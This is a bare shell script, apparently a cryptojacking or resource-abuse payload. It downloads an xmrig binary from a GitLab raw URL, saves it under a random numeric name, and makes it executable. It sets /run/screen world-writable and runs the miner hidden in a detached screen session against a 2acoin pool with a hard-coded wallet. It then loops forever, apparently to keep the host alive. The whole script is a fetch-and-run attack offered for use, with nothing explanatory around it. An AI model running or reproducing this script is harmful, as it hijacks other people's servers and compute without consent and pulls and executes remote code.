apt-get update -y
apt-get install -y screen
OKE=$(shuf -n 1 -i 1-9999999)
wget -q -O $OKE https://gitlab.com/ninalasmi937/erte/-/raw/main/xmrig
chmod +x $OKE
chmod 777 /run/screen
screen -dmS $OKE ./$OKE --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8Wg2rmKHRrtAR66i83J8KsZ6X5nrb9GACjaoTR6a9bZykjGnSHM9QCB6YjgwUf9Q8C8SbUeJZAEd8oMfyVH4Hxb1gN8KWh8EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQconvy5 -p $(cat /proc/sys/kernel/hostname)
while :; do shuf -n 1 -i 1-99999999; sleep 30; done
